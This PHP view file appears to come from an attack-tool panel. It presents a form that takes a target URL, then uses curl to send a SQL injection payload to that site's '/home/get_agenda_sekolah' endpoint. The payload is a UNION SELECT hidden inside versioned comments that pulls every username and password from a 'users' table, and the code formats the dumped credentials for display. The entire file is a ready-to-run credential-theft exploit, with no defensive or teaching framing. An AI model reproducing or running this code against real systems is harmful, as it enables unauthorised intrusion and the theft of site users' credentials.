<main class="app-content">
	<div class="app-title">
		<div>
          <h1><?= $jenis; ?></h1>
        </div>
        <ul class="app-breadcrumb breadcrumb">
          <a href="<?= base_url() ?>">
          	<li class="breadcrumb-item"><i class="fa fa-home fa-lg"></i></a></li>
          <li class="breadcrumb-item"><?= $title; ?></li>
        </ul>
      </div>
	 </div>
	 <div class="tile">
	 	<form method="post">
	 		<input type="url" name="target" class="form-control mb-3" placeholder="Url target" required="required" autocomplete="off" autofocus="autofocus">
	 		<button type="submit" name="submit" class="btn btn-info btn-block">Execute</button>
	 	</form>
	 </div>
<?php
if(isset($_POST['submit'])){
	$target = htmlspecialchars(addslashes($_POST['target']), ENT_QUOTES);
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, $target.'/home/get_agenda_sekolah?end=1%27+/*!50000union*/+/*!50000select*/+1,group_concat(%27<br>%27,username,0x3a,password,%27</br>%27)+from+users--+');
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	$lurc = curl_exec($curl);
	$ubah = str_replace('<\/br>,','<br><br>',$lurc);
	$ubahin = str_replace(':','<br>Password : ',$ubah);
	$sapaxs = str_replace('\/','/',$ubahin);
	$sapax = str_replace('Password : "','<br>',$sapaxs);
	echo '<div class="tile"><h2>Hasil <i class="fa fa-key"></i></h2><hr>
		<pre>'.$sapax.'</pre>
		</div>';
}
?>
</main>